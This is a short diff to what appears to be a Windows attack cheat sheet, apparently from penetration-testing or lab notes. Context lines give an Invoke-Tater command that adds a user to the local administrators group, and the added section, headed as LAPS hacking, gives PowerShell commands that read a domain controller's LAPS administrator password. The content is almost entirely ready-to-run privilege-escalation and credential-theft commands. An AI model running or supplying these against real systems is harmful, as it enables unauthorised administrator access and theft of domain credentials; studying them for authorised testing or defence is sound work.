@@ -353,3 +353,10 @@ Windows VM
 3. In Power Shell prompt type: Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
 4. To confirm that the attack was successful, in Power Shell prompt type: net localgroup administrators
 
+# LAPS (взлом)
+
+https://github.com/ztrhgf/LAPS.git
+
+import-module AdmPwd.PS\AdmPwd.PS.psd1
+
+get-admpwdpassword -computername dc01 | Select password
